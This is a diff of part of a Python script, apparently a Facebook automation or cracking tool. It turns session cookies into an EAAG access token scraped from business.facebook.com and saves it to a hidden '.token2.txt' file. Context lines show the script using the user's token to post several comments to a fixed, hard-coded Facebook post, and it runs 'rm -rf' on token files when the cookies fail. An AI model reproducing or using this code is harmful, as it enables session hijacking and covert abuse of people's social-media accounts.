@@ -478,16 +478,17 @@ def login_lagi334():
 									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom4}&access_token={tok}", headers = {"cookie":your_cookies})
 									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom3}&access_token={tok}", headers = {"cookie":your_cookies})
 									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom6}&access_token={tok}", headers = {"cookie":your_cookies})
-									try:
-										cookies = {'cookie':your_cookies}
-										url = 'https://business.facebook.com/business_locations'
-										req = ses.get(url,cookies=cookies)
-										tok = re.search('(\["EAAG\w+)', req.text).group(1).replace('["','')
-										open(".token2.txt", "w").write(tok)
-									except Exception as p:
-										print(p)
 							except Exception as e:
 								print(e)
+							try:
+								cookie = {'cookie':cok}
+								with requests.Session() as xyz:
+									url = 'https://business.facebook.com/business_locations'
+									req = xyz.get(url,cookies=cookie)
+									tok = re.search('(\["EAAG\w+)', req.text).group(1).replace('["','')
+									open(".token2.txt","w").write(tok)
+							except Exception as e:
+								return('Cookies Invalid')
 			except Exception as e:
 				Console().print(f" {H2}• {P2}[bold red]Cookies Kadaluwarsa Bang")
 				os.system('rm -rf .token.txt && rm -rf .cok.txt && rm -rf .token1.txt && rm -rf .token.txt')
